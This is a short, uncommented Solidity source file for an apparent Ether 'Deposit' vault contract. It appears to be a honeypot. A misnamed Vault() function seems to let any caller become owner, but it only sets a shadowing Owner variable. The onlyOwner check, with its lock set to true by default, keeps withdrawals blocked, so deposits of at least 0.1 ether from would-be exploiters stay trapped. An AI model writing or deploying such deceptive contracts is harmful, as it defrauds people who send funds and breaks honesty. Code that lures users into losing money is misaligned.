1 pragma solidity ^0.4.7;
2 
3 contract ForeignToken {
4     function balanceOf(address who) constant public returns (uint256);
5     function transfer(address to, uint256 amount) public;
6 }
7 
8 contract Owned {
9     bool public locked = true;
10     address public Owner = msg.sender;
11     modifier onlyOwner { if (msg.sender == Owner || !locked) _; }
12     function lock(bool flag) onlyOwner { locked = flag; }
13 }
14 
15 contract Deposit is Owned {
16     address public Owner;
17     mapping (address => uint) public Deposits;
18 
19     event Deposit(uint amount);
20     event Withdraw(uint amount);
21     
22     function Vault() payable {
23         Owner = msg.sender;
24         deposit();
25     }
26     
27     function() payable {
28         deposit();
29     }
30 
31     function deposit() payable {
32         if (msg.value >= 0.1 ether) {
33             Deposits[msg.sender] += msg.value;
34             Deposit(msg.value);
35         }
36     }
37 
38     function kill() payable {
39         if (this.balance == 0)
40             selfdestruct(msg.sender);
41     }
42     
43     function withdraw(uint amount) payable onlyOwner {
44         if (Deposits[msg.sender] > 0 && amount <= Deposits[msg.sender]) {
45             msg.sender.send(amount);
46             Withdraw(amount);
47         }
48     }
49     
50     function withdrawToken(address token, uint amount) payable onlyOwner {
51         uint bal = ForeignToken(token).balanceOf(address(this));
52         if (bal >= amount) {
53             ForeignToken(token).transfer(msg.sender, amount);
54         }
55     }
56 }